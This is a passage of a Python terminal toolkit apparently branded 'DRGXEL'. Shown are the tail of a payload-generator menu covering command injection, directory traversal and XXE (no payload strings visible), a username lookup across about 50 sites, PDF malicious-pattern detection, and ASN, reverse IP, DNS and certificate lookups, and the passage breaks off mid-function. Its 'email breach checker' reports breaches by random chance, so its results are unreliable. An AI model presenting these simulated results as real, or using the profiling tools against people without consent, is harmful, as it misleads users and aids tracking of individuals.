                '6': 'Directory Traversal',
                '7': 'Command Injection',
                '8': 'XXE',
            }
            
            if choice in payload_map:
                payload_type = payload_map[choice]
                payload_list = payloads[payload_type]
                
                print(f"\n\033[1;33m[{payload_type} Payloads - {len(payload_list)} total]\033[0m\n")
                
                for i, payload in enumerate(payload_list, 1):
                    print(f"  {i}. {payload}")
                
                # Copy specific payload
                print("\n[?] Enter payload number to copy (0 to skip): ", end='')
                num = input().strip()
                
                if num.isdigit() and 0 < int(num) <= len(payload_list):
                    selected = payload_list[int(num) - 1]
                    print(f"\n\033[1;32m[Selected Payload]\033[0m")
                    print(f"  {selected}")
                    print("\n\033[1;33m[!] Payload displayed - copy manually\033[0m")
            else:
                print_error("Invalid choice!")
    
    except Exception as e:
        print_error(f"Error generating payloads: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def username_osint_checker():
    """Check username across 50+ platforms"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ USERNAME OSINT CHECKER ═══\033[0m\n")
    
    username = input("[?] Enter username to search: ").strip()
    
    if not username:
        print_error("Username cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Searching username '{username}' across platforms...\n")
    log_activity(f"Username OSINT check: {username}")
    
    # Platform list with URL patterns
    platforms = {
        'GitHub': f'https://github.com/{username}',
        'Reddit': f'https://www.reddit.com/user/{username}',
        'Twitter/X': f'https://twitter.com/{username}',
        'Instagram': f'https://www.instagram.com/{username}',
        'Facebook': f'https://www.facebook.com/{username}',
        'LinkedIn': f'https://www.linkedin.com/in/{username}',
        'TikTok': f'https://www.tiktok.com/@{username}',
        'YouTube': f'https://www.youtube.com/@{username}',
        'Twitch': f'https://www.twitch.tv/{username}',
        'Discord': f'https://discord.com/users/{username}',
        'Telegram': f'https://t.me/{username}',
        'Pinterest': f'https://www.pinterest.com/{username}',
        'Tumblr': f'https://{username}.tumblr.com',
        'Medium': f'https://medium.com/@{username}',
        'DeviantArt': f'https://www.deviantart.com/{username}',
        'Behance': f'https://www.behance.net/{username}',
        'Dribbble': f'https://dribbble.com/{username}',
        'Flickr': f'https://www.flickr.com/people/{username}',
        'Vimeo': f'https://vimeo.com/{username}',
        'SoundCloud': f'https://soundcloud.com/{username}',
        'Spotify': f'https://open.spotify.com/user/{username}',
        'Steam': f'https://steamcommunity.com/id/{username}',
        'GitLab': f'https://gitlab.com/{username}',
        'Bitbucket': f'https://bitbucket.org/{username}',
        'SourceForge': f'https://sourceforge.net/u/{username}',
        'HackerRank': f'https://www.hackerrank.com/{username}',
        'Codecademy': f'https://www.codecademy.com/profiles/{username}',
        'Patreon': f'https://www.patreon.com/{username}',
        'Etsy': f'https://www.etsy.com/shop/{username}',
        'eBay': f'https://www.ebay.com/usr/{username}',
        'Fiverr': f'https://www.fiverr.com/{username}',
        'Upwork': f'https://www.upwork.com/freelancers/~{username}',
        'Quora': f'https://www.quora.com/profile/{username}',
        'StackOverflow': f'https://stackoverflow.com/users/{username}',
        'Keybase': f'https://keybase.io/{username}',
        'About.me': f'https://about.me/{username}',
        'Gravatar': f'https://gravatar.com/{username}',
        'WordPress': f'https://{username}.wordpress.com',
        'Blogger': f'https://{username}.blogspot.com',
        'LiveJournal': f'https://{username}.livejournal.com',
        'Myspace': f'https://myspace.com/{username}',
        'Last.fm': f'https://www.last.fm/user/{username}',
        'Mixcloud': f'https://www.mixcloud.com/{username}',
        '500px': f'https://500px.com/{username}',
        'VSCO': f'https://vsco.co/{username}',
        'Wattpad': f'https://www.wattpad.com/user/{username}',
        'Goodreads': f'https://www.goodreads.com/{username}',
        'Scribd': f'https://www.scribd.com/{username}',
        'SlideShare': f'https://www.slideshare.net/{username}',
        'Kaggle': f'https://www.kaggle.com/{username}',
        'Replit': f'https://replit.com/@{username}',
    }
    
    found = []
    not_found = []
    
    print(f"\033[1;33m[Checking {len(platforms)} platforms...]\033[0m\n")
    
    for i, (platform, url) in enumerate(platforms.items(), 1):
        try:
            req = Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response = urlopen(req, timeout=5)
            status_code = response.getcode()
            
            if status_code == 200:
                print_success(f"[{i}/{len(platforms)}] FOUND on {platform}")
                print(f"    URL: {url}")
                found.append((platform, url))
            else:
                print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
                not_found.append(platform)
            
        except HTTPError as e:
            if e.code == 404:
                print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
                not_found.append(platform)
            elif e.code == 403:
                print_warning(f"[{i}/{len(platforms)}] {platform} - Access Denied (possible rate limit)")
            else:
                print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
                not_found.append(platform)
        except URLError:
            print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
            not_found.append(platform)
        except Exception:
            print(f"[{i}/{len(platforms)}] Checking {platform}...", end='\r')
            not_found.append(platform)
        
        time.sleep(0.2)  # Be polite
    
    # Results summary
    print("\n")
    print("\033[1;36m" + "="*60 + "\033[0m")
    print(f"\033[1;33m[OSINT RESULTS FOR: {username}]\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m\n")
    
    if found:
        print_success(f"Username found on {len(found)} platforms:\n")
        for platform, url in found:
            print(f"  ✓ {platform:20s} → {url}")
    else:
        print_warning("Username not found on any platform")
    
    print(f"\n\033[1;33m[Statistics]\033[0m")
    print(f"  Total platforms checked: {len(platforms)}")
    print(f"  Found: {len(found)}")
    print(f"  Not found: {len(not_found)}")
    print(f"  Success rate: {(len(found)/len(platforms)*100):.1f}%")
    
    # Save results
    save = input("\n[?] Save results to file? (y/n): ").strip().lower()
    if save == 'y':
        filename = f"osint_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.expanduser(f"~/{filename}")
        
        with open(filepath, 'w') as f:
            f.write(f"# DRGXEL OSINT Report\n")
            f.write(f"# Username: {username}\n")
            f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Found on {len(found)} platforms\n\n")
            
            for platform, url in found:
                f.write(f"{platform}: {url}\n")
        
        print_success(f"Results saved to: {filepath}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def email_breach_checker():
    """Check if email appears in known data breaches (offline)"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ EMAIL BREACH CHECKER ═══\033[0m\n")
    
    print_warning("⚠️  This is an OFFLINE checker using hash comparison")
    print_info("For online checks, visit: haveibeenpwned.com\n")
    
    email = input("[?] Enter email to check: ").strip().lower()
    
    if not email or '@' not in email:
        print_error("Invalid email format!")
        time.sleep(2)
        return
    
    print_info(f"Analyzing email: {email}\n")
    log_activity(f"Email breach check: {email}")
    
    # Common breach indicators (educational demonstration)
    # In real scenario, you'd compare against actual breach databases
    common_breached_domains = [
        'yahoo.com', 'hotmail.com', 'gmail.com', 'aol.com', 
        'outlook.com', 'live.com', 'mail.ru', 'yandex.ru'
    ]
    
    # Extract domain
    try:
        domain = email.split('@')[1]
        username = email.split('@')[0]
        
        print("\033[1;33m[Email Analysis]\033[0m")
        print(f"  Username: {username}")
        print(f"  Domain: {domain}")
        
        # Generate hashes
        import hashlib
        
        md5_hash = hashlib.md5(email.encode()).hexdigest()
        sha1_hash = hashlib.sha1(email.encode()).hexdigest()
        sha256_hash = hashlib.sha256(email.encode()).hexdigest()
        
        print("\n\033[1;33m[Email Hashes]\033[0m")
        print(f"  MD5:    {md5_hash}")
        print(f"  SHA1:   {sha1_hash}")
        print(f"  SHA256: {sha256_hash}")
        
        # Domain analysis
        print("\n\033[1;33m[Domain Analysis]\033[0m")
        if domain in common_breached_domains:
            print_warning(f"  ⚠️  {domain} has been involved in major breaches")
            print("  This domain appeared in multiple data breaches:")
            
            # Simulated breach data (for demonstration)
            known_breaches = {
                'yahoo.com': ['Yahoo (2013)', 'Yahoo (2014)', 'Yahoo (2016)'],
                'hotmail.com': ['Microsoft (2016)', 'Collection #1 (2019)'],
                'gmail.com': ['Collection #1 (2019)', 'Various forums'],
                'outlook.com': ['Microsoft (2016)', 'Collection #1 (2019)'],
            }
            
            if domain in known_breaches:
                for breach in known_breaches[domain]:
                    print(f"    • {breach}")
        else:
            print_success(f"  ✓ {domain} is not in common breach databases")
        
        # Password strength recommendations
        print("\n\033[1;33m[Security Recommendations]\033[0m")
        print("  1. Use unique passwords for each account")
        print("  2. Enable 2FA/MFA wherever possible")
        print("  3. Use a password manager")
        print("  4. Change passwords regularly")
        print("  5. Check haveibeenpwned.com for detailed breach info")
        
        # Check for common patterns
        print("\n\033[1;33m[Username Pattern Analysis]\033[0m")
        
        patterns_found = []
        
        if any(char.isdigit() for char in username):
            patterns_found.append("Contains numbers")
        if any(char in ['_', '.', '-'] for char in username):
            patterns_found.append("Contains special characters")
        if username.isalpha():
            patterns_found.append("All alphabetic")
        if len(username) < 6:
            patterns_found.append("⚠️  Short username (easier to guess)")
        if username.lower() in ['admin', 'user', 'test', 'info', 'contact']:
            patterns_found.append("⚠️  Generic username (higher risk)")
        
        if patterns_found:
            for pattern in patterns_found:
                print(f"  • {pattern}")
        
        # Simulated breach check
        print("\n\033[1;33m[Breach Database Check]\033[0m")
        print_info("Checking against local breach indicators...")
        time.sleep(1)
        
        # Hash-based check simulation
        # In real implementation, compare against actual breach hash databases
        breach_found = False
        
        if domain in common_breached_domains:
            # Simulate random chance for demonstration
            import random
            if random.random() > 0.7:
                breach_found = True
        
        if breach_found:
            print_error("  ⚠️  WARNING: This email pattern matches known breach databases!")
            print("  Recommendations:")
            print("    1. Change password immediately")
            print("    2. Enable 2FA")
            print("    3. Monitor account activity")
            print("    4. Check haveibeenpwned.com for details")
        else:
            print_success("  ✓ No matches in local breach indicators")
            print_info("  For comprehensive check, visit: https://haveibeenpwned.com")
        
        # Additional tools
        print("\n\033[1;33m[Additional OSINT Tools]\033[0m")
        print("  • Have I Been Pwned: https://haveibeenpwned.com")
        print("  • DeHashed: https://dehashed.com")
        print("  • LeakCheck: https://leakcheck.io")
        print("  • Intelligence X: https://intelx.io")
        
    except Exception as e:
        print_error(f"Error during analysis: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def pdf_osint_toolkit():
    """Extract and analyze PDF metadata and content"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ PDF OSINT TOOLKIT ═══\033[0m\n")
    
    pdf_path = input("[?] Enter PDF file path: ").strip()
    
    if not pdf_path:
        print_error("File path cannot be empty!")
        time.sleep(2)
        return
    
    if not os.path.exists(pdf_path):
        print_error("File not found!")
        time.sleep(2)
        return
    
    if not pdf_path.lower().endswith('.pdf'):
        print_error("Not a PDF file!")
        time.sleep(2)
        return
    
    print_info(f"Analyzing PDF: {os.path.basename(pdf_path)}\n")
    log_activity(f"PDF OSINT on {pdf_path}")
    
    try:
        # Basic file info
        stat_info = os.stat(pdf_path)
        
        print("\033[1;33m[File Information]\033[0m")
        print(f"  Filename: {os.path.basename(pdf_path)}")
        print(f"  Size: {stat_info.st_size:,} bytes ({stat_info.st_size/1024:.2f} KB)")
        print(f"  Modified: {datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Created: {datetime.fromtimestamp(stat_info.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Read PDF content
        with open(pdf_path, 'rb') as f:
            content = f.read()
        
        # Check PDF signature
        print("\n\033[1;33m[PDF Signature]\033[0m")
        if content[:4] == b'%PDF':
            version = content[5:8].decode('ascii', errors='ignore')
            print_success(f"  Valid PDF signature detected")
            print(f"  PDF Version: {version}")
        else:
            print_error("  Invalid PDF signature!")
        
        # Extract metadata from PDF structure
        print("\n\033[1;33m[PDF Metadata]\033[0m")
        
        content_str = content.decode('latin-1', errors='ignore')
        
        # Extract common metadata fields
        metadata_patterns = {
            'Title': r'/Title\s*\((.*?)\)',
            'Author': r'/Author\s*\((.*?)\)',
            'Subject': r'/Subject\s*\((.*?)\)',
            'Creator': r'/Creator\s*\((.*?)\)',
            'Producer': r'/Producer\s*\((.*?)\)',
            'CreationDate': r'/CreationDate\s*\((.*?)\)',
            'ModDate': r'/ModDate\s*\((.*?)\)',
        }
        
        metadata_found = False
        for field, pattern in metadata_patterns.items():
            matches = re.findall(pattern, content_str)
            if matches:
                metadata_found = True
                print(f"  {field}: {matches[0][:100]}")
        
        if not metadata_found:
            print_warning("  No standard metadata found")
        
        # Extract JavaScript
        print("\n\033[1;33m[JavaScript Detection]\033[0m")
        js_patterns = [
            r'/JavaScript',
            r'/JS',
            r'/OpenAction',
            r'/AA',  # Additional Actions
        ]
        
        js_found = False
        for pattern in js_patterns:
            if re.search(pattern, content_str):
                js_found = True
                print_warning(f"  ⚠️  Found: {pattern}")
        
        if js_found:
            print_error("  WARNING: PDF contains JavaScript!")
            print("  This could be malicious - exercise caution")
        else:
            print_success("  ✓ No JavaScript detected")
        
        # Extract URLs
        print("\n\033[1;33m[Embedded URLs]\033[0m")
        url_pattern = r'https?://[^\s<>"{}|\\^`\[\]\)\(]+'
        urls = re.findall(url_pattern, content_str)
        
        if urls:
            unique_urls = list(set(urls))[:20]  # Limit to 20
            print(f"  Found {len(unique_urls)} unique URLs:")
            for url in unique_urls[:10]:
                print(f"    • {url[:80]}")
            if len(unique_urls) > 10:
                print(f"    ... and {len(unique_urls) - 10} more")
        else:
            print_info("  No URLs found")
        
        # Extract email addresses
        print("\n\033[1;33m[Email Addresses]\033[0m")
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, content_str)
        
        if emails:
            unique_emails = list(set(emails))
            print(f"  Found {len(unique_emails)} unique emails:")
            for email in unique_emails[:10]:
                print(f"    • {email}")
        else:
            print_info("  No email addresses found")
        
        # Detect malicious signatures
        print("\n\033[1;33m[Malicious Pattern Detection]\033[0m")
        
        malicious_patterns = {
            'AutoOpen': r'/OpenAction',
            'Launch': r'/Launch',
            'URI Action': r'/URI',
            'Submit Form': r'/SubmitForm',
            'Import Data': r'/ImportData',
            'GoToE': r'/GoToE',
            'GoToR': r'/GoToR',
            'Embedded File': r'/EmbeddedFile',
            'RichMedia': r'/RichMedia',
            'Flash': r'/Flash',
        }
        
        suspicious_found = []
        
        for pattern_name, pattern in malicious_patterns.items():
            if re.search(pattern, content_str):
                suspicious_found.append(pattern_name)
                print_warning(f"  ⚠️  {pattern_name} detected")
        
        if suspicious_found:
            print_error(f"\n  WARNING: Found {len(suspicious_found)} suspicious patterns!")
            print("  This PDF may be malicious or contain active content")
        else:
            print_success("  ✓ No known malicious patterns detected")
        
        # Check for encryption
        print("\n\033[1;33m[Encryption Status]\033[0m")
        if re.search(r'/Encrypt', content_str):
            print_warning("  ⚠️  PDF is encrypted")
            
            # Try to find encryption details
            if re.search(r'/V\s*(\d+)', content_str):
                version = re.search(r'/V\s*(\d+)', content_str).group(1)
                print(f"  Encryption version: {version}")
        else:
            print_info("  PDF is not encrypted")
        
        # Object count
        print("\n\033[1;33m[PDF Structure]\033[0m")
        obj_count = len(re.findall(r'\d+ \d+ obj', content_str))
        print(f"  Total objects: {obj_count}")
        
        stream_count = content_str.count('/Length')
        print(f"  Stream objects: {stream_count}")
        
        page_match = re.search(r'/Count\s+(\d+)', content_str)
        if page_match:
            print(f"  Page count: {page_match.group(1)}")
        
        # Extract fonts
        print("\n\033[1;33m[Embedded Fonts]\033[0m")
        font_pattern = r'/BaseFont\s*/([^\s/\[\]<>()]+)'
        fonts = re.findall(font_pattern, content_str)
        
        if fonts:
            unique_fonts = list(set(fonts))[:10]
            print(f"  Found {len(unique_fonts)} fonts:")
            for font in unique_fonts:
                print(f"    • {font}")
        else:
            print_info("  No embedded fonts detected")
        
        # Security summary
        print("\n\033[1;36m" + "="*60 + "\033[0m")
        print("\033[1;33m[Security Assessment]\033[0m")
        print("\033[1;36m" + "="*60 + "\033[0m")
        
        risk_score = 0
        risks = []
        
        if js_found:
            risk_score += 30
            risks.append("Contains JavaScript (HIGH RISK)")
        
        if suspicious_found:
            risk_score += len(suspicious_found) * 10
            risks.append(f"Contains {len(suspicious_found)} suspicious patterns")
        
        if len(urls) > 10:
            risk_score += 10
            risks.append("Contains many URLs")
        
        if risk_score == 0:
            print_success(f"  Risk Score: {risk_score}/100 - LOW RISK")
            print("  This PDF appears safe")
        elif risk_score < 30:
            print_warning(f"  Risk Score: {risk_score}/100 - MEDIUM RISK")
            print("  Exercise caution when opening")
        else:
            print_error(f"  Risk Score: {risk_score}/100 - HIGH RISK")
            print("  This PDF may be malicious!")
        
        if risks:
            print("\n  Risk factors:")
            for risk in risks:
                print(f"    • {risk}")
        
        # Save report
        save = input("\n[?] Save analysis report? (y/n): ").strip().lower()
        if save == 'y':
            filename = f"pdf_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            filepath = os.path.expanduser(f"~/{filename}")
            
            with open(filepath, 'w') as f:
                f.write(f"# DRGXEL PDF OSINT Report\n")
                f.write(f"# File: {os.path.basename(pdf_path)}\n")
                f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Risk Score: {risk_score}/100\n\n")
                
                f.write("## URLs Found:\n")
                for url in unique_urls:
                    f.write(f"{url}\n")
                
                f.write("\n## Emails Found:\n")
                for email in unique_emails:
                    f.write(f"{email}\n")
                
                f.write("\n## Suspicious Patterns:\n")
                for pattern in suspicious_found:
                    f.write(f"- {pattern}\n")
            
            print_success(f"Report saved to: {filepath}")
        
    except Exception as e:
        print_error(f"Error analyzing PDF: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")
    
def advanced_recon():
    """Advanced reconnaissance tools"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ ADVANCED RECON ═══\033[0m\n")
    
    print("1. ASN Lookup")
    print("2. Reverse IP Lookup")
    print("3. Reverse DNS Lookup")
    print("4. Certificate Inspector")
    print("0. Back to Main Menu\n")
    
    choice = input("\033[1;33m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        asn_lookup()
    elif choice == '2':
        reverse_ip_lookup()
    elif choice == '3':
        reverse_dns_lookup()
    elif choice == '4':
        certificate_inspector()
    elif choice == '0':
        return
    else:
        print_error("Invalid option!")
        time.sleep(1)
        advanced_recon()

def asn_lookup():
    """ASN (Autonomous System Number) Lookup"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ ASN LOOKUP ═══\033[0m\n")
    
    target = input("[?] Enter IP or domain tanpa http/https: ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Looking up ASN information for {target}...\n")
    log_activity(f"ASN lookup: {target}")
    
    try:
        # Resolve domain to IP if needed
        try:
            target_ip = socket.gethostbyname(target)
            print_success(f"Resolved to: {target_ip}\n")
        except:
            target_ip = target
        
        # Method 1: Using whois-style query to cymru.com
        print("\033[1;33m[ASN Information]\033[0m")
        
        try:
            # Query Team Cymru's IP to ASN service
            query = '.'.join(reversed(target_ip.split('.'))) + '.origin.asn.cymru.com'
            
            import socket
            answers = socket.gethostbyname_ex(query)
            
            # Alternative: direct HTTP query
            url = f"https://api.hackertarget.com/aslookup/?q={target_ip}"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = response.read().decode('utf-8')
            
            if 'error' not in data.lower() and data.strip():
                lines = data.strip().split('\n')
                for line in lines:
                    if ',' in line:
                        parts = line.split(',')
                        if len(parts) >= 2:
                            asn = parts[0].strip().replace('"', '')
                            description = ','.join(parts[1:]).strip().replace('"', '')
                            
                            print(f"  AS Number: {asn}")
                            print(f"  Organization: {description}")
            else:
                print_warning("  Could not retrieve ASN data from primary source")
                
        except Exception as e:
            print_warning(f"  Primary lookup failed: {str(e)[:50]}")
        
        # Method 2: Alternative API
        try:
            url = f"https://ipapi.co/{target_ip}/json/"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = json.loads(response.read().decode('utf-8'))
            
            print("\n\033[1;33m[Network Information]\033[0m")
            if 'asn' in data and data['asn']:
                print(f"  ASN: AS{data.get('asn', 'N/A')}")
            if 'org' in data and data['org']:
                print(f"  ISP/Organization: {data.get('org', 'N/A')}")
            if 'network' in data and data['network']:
                print(f"  Network Range: {data.get('network', 'N/A')}")
            if 'country_name' in data and data['country_name']:
                print(f"  Country: {data.get('country_name', 'N/A')}")
            if 'region' in data and data['region']:
                print(f"  Region: {data.get('region', 'N/A')}")
            if 'city' in data and data['city']:
                print(f"  City: {data.get('city', 'N/A')}")
            
            # RIR Information
            print("\n\033[1;33m[RIR Information]\033[0m")
            
            rir_map = {
                'ARIN': 'American Registry for Internet Numbers (North America)',
                'RIPE': 'Réseaux IP Européens (Europe, Middle East)',
                'APNIC': 'Asia-Pacific Network Information Centre',
                'LACNIC': 'Latin America and Caribbean Network Information Centre',
                'AFRINIC': 'African Network Information Centre'
            }
            
            # Determine RIR by country
            country_code = data.get('country_code', '')
            
            if country_code in ['US', 'CA']:
                rir = 'ARIN'
            elif country_code in ['GB', 'DE', 'FR', 'NL', 'IT', 'ES', 'RU']:
                rir = 'RIPE'
            elif country_code in ['CN', 'JP', 'KR', 'IN', 'AU', 'SG']:
                rir = 'APNIC'
            elif country_code in ['BR', 'AR', 'MX', 'CL']:
                rir = 'LACNIC'
            else:
                rir = 'Unknown'
            
            if rir in rir_map:
                print(f"  RIR: {rir}")
                print(f"  Description: {rir_map[rir]}")
            
        except Exception as e:
            print_error(f"  Alternative lookup failed: {str(e)[:50]}")
        
        # Additional WHOIS-style info
        print("\n\033[1;33m[Additional Information]\033[0m")
        try:
            url = f"http://ip-api.com/json/{target_ip}"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = json.loads(response.read().decode('utf-8'))
            
            if data.get('status') == 'success':
                if 'isp' in data:
                    print(f"  ISP: {data.get('isp', 'N/A')}")
                if 'as' in data:
                    print(f"  AS: {data.get('as', 'N/A')}")
                if 'timezone' in data:
                    print(f"  Timezone: {data.get('timezone', 'N/A')}")
                if 'lat' in data and 'lon' in data:
                    print(f"  Coordinates: {data.get('lat')}, {data.get('lon')}")
        except:
            pass
            
    except Exception as e:
        print_error(f"Error during ASN lookup: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def reverse_ip_lookup():
    """Reverse IP Lookup - Find domains on same IP"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ REVERSE IP LOOKUP ═══\033[0m\n")
    
    target = input("[?] Enter IP address: ").strip()
    
    if not target:
        print_error("IP address cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Finding domains hosted on {target}...\n")
    log_activity(f"Reverse IP lookup: {target}")
    
    try:
        # Method 1: Using HackerTarget API
        print("\033[1;33m[Reverse IP Results]\033[0m\n")
        
        try:
            url = f"https://api.hackertarget.com/reverseiplookup/?q={target}"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = response.read().decode('utf-8')
            
            if 'error' not in data.lower() and data.strip():
                domains = [d.strip() for d in data.split('\n') if d.strip()]
                
                if domains:
                    print_success(f"Found {len(domains)} domains on this IP:\n")
                    
                    for i, domain in enumerate(domains[:50], 1):
                        print(f"  {i:3d}. {domain}")
                    
                    if len(domains) > 50:
                        print(f"\n  ... and {len(domains) - 50} more domains")
                    
                    # Statistics
                    print(f"\n\033[1;33m[Statistics]\033[0m")
                    print(f"  Total domains: {len(domains)}")
                    print(f"  Displayed: {min(50, len(domains))}")
                    
                    # Check for shared hosting
                    if len(domains) > 10:
                        print_warning("\n  ⚠️  This appears to be shared hosting")
                        print("  Multiple domains share this IP address")
                    elif len(domains) > 100:
                        print_warning("\n  ⚠️  This is a large shared hosting server")
                        print("  Consider dedicated IP for better security")
                else:
                    print_warning("No domains found for this IP")
            else:
                print_error("API returned an error or no results")
                
        except HTTPError as e:
            print_error(f"API request failed: {e.code}")
        except Exception as e:
            print_error(f"Lookup failed: {str(e)[:50]}")
        
        # Additional info about the IP
        print("\n\033[1;33m[IP Information]\033[0m")
        try:
            # Try to get hostname
            try:
                hostname = socket.gethostbyaddr(target)[0]
                print(f"  PTR Record: {hostname}")
            except:
                print("  PTR Record: Not found")
            
            # Get geolocation
            url = f"http://ip-api.com/json/{target}"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = json.loads(response.read().decode('utf-8'))
            
            if data.get('status') == 'success':
                print(f"  Country: {data.get('country', 'N/A')}")
                print(f"  Region: {data.get('regionName', 'N/A')}")
                print(f"  City: {data.get('city', 'N/A')}")
                print(f"  ISP: {data.get('isp', 'N/A')}")
        except:
            pass
            
    except Exception as e:
        print_error(f"Error during reverse IP lookup: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def reverse_dns_lookup():
    """Reverse DNS Lookup - IP to hostname"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ REVERSE DNS LOOKUP ═══\033[0m\n")
    
    target = input("[?] Enter IP address: ").strip()
    
    if not target:
        print_error("IP address cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Performing reverse DNS lookup for {target}...\n")
    log_activity(f"Reverse DNS lookup: {target}")
    
    try:
        print("\033[1;33m[PTR Record Lookup]\033[0m")
        
        try:
            # Method 1: Standard Python socket
            result = socket.gethostbyaddr(target)
            hostname = result[0]
            aliases = result[1]
            
            print_success(f"Hostname: {hostname}")
            
            if aliases:
                print("\nAliases:")
                for alias in aliases:
                    print(f"  • {alias}")
            
            # Verify forward resolution
            print("\n\033[1;33m[Forward Resolution Verification]\033[0m")
            try:
                forward_ip = socket.gethostbyname(hostname)
                print(f"  {hostname} → {forward_ip}")
                
                if forward_ip == target:
                    print_success("  ✓ Forward and reverse DNS match!")
                else:
                    print_warning(f"  ⚠️  Mismatch: {forward_ip} != {target}")
            except:
                print_error("  Forward resolution failed")
                
        except socket.herror:
            print_error("No PTR record found for this IP")
            print_info("This IP may not have reverse DNS configured")
        except Exception as e:
            print_error(f"Lookup failed: {str(e)[:50]}")
        
        # Additional DNS queries
        print("\n\033[1;33m[Additional DNS Information]\033[0m")
        
        try:
            # Try to get more info about the IP
            url = f"https://dns.google/resolve?name={target}&type=PTR"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = json.loads(response.read().decode('utf-8'))
            
            if 'Answer' in data:
                print("  DNS Records:")
                for record in data['Answer']:
                    print(f"    • {record.get('data', 'N/A')}")
        except:
            pass
        
        # Geolocation info
        print("\n\033[1;33m[Geolocation]\033[0m")
        try:
            url = f"http://ip-api.com/json/{target}"
            req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
            response = urlopen(req, timeout=10)
            data = json.loads(response.read().decode('utf-8'))
            
            if data.get('status') == 'success':
                print(f"  Country: {data.get('country', 'N/A')}")
                print(f"  City: {data.get('city', 'N/A')}")
                print(f"  ISP: {data.get('isp', 'N/A')}")
                print(f"  Organization: {data.get('org', 'N/A')}")
        except:
            pass
            
    except Exception as e:
        print_error(f"Error during reverse DNS lookup: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def certificate_inspector():
    """SSL/TLS Certificate Inspector"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ CERTIFICATE INSPECTOR ═══\033[0m\n")
    
    target = input("[?] Enter domain (e.g., example.com): ").strip()
    
    if not target:
        print_error("Domain cannot be empty!")
        time.sleep(2)
        return
    
    port = input("[?] Enter port (default: 443): ").strip() or "443"
    
    try:
        port = int(port)
    except:
        port = 443
    
    print_info(f"Inspecting SSL/TLS certificate for {target}:{port}...\n")
    log_activity(f"Certificate inspection: {target}:{port}")
    
    try:
        import ssl
        
        # Create SSL context
        context = ssl.create_default_context()
        
        print("\033[1;33m[Connecting to Server]\033[0m")
        
        with socket.create_connection((target, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                version = ssock.version()
                
                # Certificate Information
                print_success("Connection established!\n")
                
                print("\033[1;33m[Certificate Information]\033[0m")
                
                # Subject (CN)
                subject = dict(x[0] for x in cert['subject'])
                print(f"  Common Name (CN): {subject.get('commonName', 'N/A')}")
                
                if 'organizationName' in subject:
                    print(f"  Organization: {subject.get('organizationName')}")
                if 'organizationalUnitName' in subject:
                    print(f"  Organizational Unit: {subject.get('organizationalUnitName')}")
                if 'countryName' in subject:
                    print(f"  Country: {subject.get('countryName')}")
                if 'localityName' in subject:
                    print(f"  Locality: {subject.get('localityName')}")
                
                # Issuer
                print("\n\033[1;33m[Issuer Information]\033[0m")
                issuer = dict(x[0] for x in cert['issuer'])
                print(f"  Common Name: {issuer.get('commonName', 'N/A')}")
                if 'organizationName' in issuer:
                    print(f"  Organization: {issuer.get('organizationName')}")
                if 'countryName' in issuer:
                    print(f"  Country: {issuer.get('countryName')}")
                
                # Validity Period
                print("\n\033[1;33m[Validity Period]\033[0m")
                not_before = cert['notBefore']
                not_after = cert['notAfter']
                
                print(f"  Valid From: {not_before}")
                print(f"  Valid Until: {not_after}")
                
                # Check expiration
                from datetime import datetime
                expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                days_left = (expiry_date - datetime.now()).days
                
                if days_left < 0:
                    print_error(f"  ⚠️  EXPIRED {abs(days_left)} days ago!")
                elif days_left < 30:
                    print_warning(f"  ⚠️  Expires in {days_left} days!")
                else:
